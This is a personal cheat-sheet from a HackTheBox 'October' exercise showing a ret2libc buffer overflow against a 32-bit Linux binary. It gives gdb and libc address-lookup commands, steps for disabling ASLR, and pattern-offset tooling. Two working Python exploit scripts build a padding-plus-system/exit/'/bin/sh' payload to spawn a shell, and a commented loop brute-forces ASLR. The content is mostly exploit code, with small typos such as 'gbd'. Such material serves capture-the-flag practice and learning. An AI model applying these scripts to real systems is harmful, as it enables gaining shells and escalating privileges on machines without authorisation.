### simplistic guide to buffer overflow on a simple binary on linux
  ```
  See the 'overflow.py' binary and Ippsec's 'Hackthebox October' video! (https://www.youtube.com/watch?v=K05mJazHhF4)
  
  Simplistic view of steps needed to do a buffer overflow attack (first get the binary over to your host machine or to a copy of the victim machine:
  
  Step 1: gdb ./<binary>    # example: gbd ./runme `python -c 'print "A"*200'`
  Step 2: b main
  Step 3: r (run)	     
  Step 4: c (continue)
  
  
  optionals   : checksec; si (switch to instructions); x/s 0x532b45 (check address); p system (get addr of system); searchmem /bin/sh (search for addr); disas main (disassemble main);
  get sys addr: readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system;
  get /bin/sh : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
  
  check ASLR  : ldd <binary> | grep libc	                        # if memory address changes everytime, ASLR is enabled
  disable ASLR: sudo echo 0 > /proc/sys/kernel/randomize_va_space # disable ASLR, which randomizes libc memory address (requires root access)
  exploit dev : locate pattern_ 	                                # /usr/share/../../pattern_create.rb
  epxloit dev2: /usr/share/../../pattern_create.rb -l 200 	      # generates a string, run it with the binary in gdb and get the break address
  exploit dev3: /usr/share/../../pattern_offset.rb -q 62413762    # get offset of the memory address of the break caused by pat_create string (remove the 0x)
  ```
  
### test overflow script on the binary on our own Kali 64-bit machine
  ```python
  # This one is to test the overflow on our host with a test binary
  import struct
  
  systemAddr = struct.pack("<I", 0xf7e0b980) # found by doing 'p system' in gdb
  exitAddr = struct.pack("<I", 0xf7dfe9b0)
  argAddr = struct.pack("<I", 0xf7f4baaa) # found by doing 'searchmem /bin/sh' in another binary
  
  buf = "A" * 52 # 52 is the offset we found with the ruby pattern scripts
  buf += systemAddr
  buf += exitAddr
  buf += argAddr
  
  print buf
  ```

### the finished overflow script on the binary (target was 32-bit ubuntu)
  ```python
  # This is the finished overflow script we use on the binary on the target machine
  # Check Ippsec's 'Hackthebox October' video
  
  # from subprocess import call
  import struct
  
  binaryLoc = "/home/<user>/binary"
  
  libcBaseAddr = 0xb7e19000 # libc address 'ldd /home/user/binary | grep libc'
  
  systemOffset = 0x0003ada0 # system address 'readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system'
  exitOffset = 0x0002e9d0   # also from 'readelf -s ... | grep exit
  argShOffset = 0x0015ba0b  # /bin/sh 'strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh'
  
  systemAddr = struct.pack("<I", libcBaseAddr + systemOffset) # found by doing 'p system' in gdb
  exitAddr = struct.pack("<I", libcBaseAddr + exitOffset)
  argAddr = struct.pack("<I", libcBaseAddr + argShOffset) # found by doing 'searchmem /bin/sh' in another binary
  
  buf = "A" * 52 # 52 is the offset we found with the ruby pattern scripts
  buf += systemAddr
  buf += exitAddr
  buf += argAddr
  
  print buf
  
  # Bruteforce ASLR (ASLR was disabled)
  #i = 0
  #while (i <= 512):
  #    print "Try %s" %i
  #    i += 1
  #   ret = call([binaryLoc, buf])
  ```
  
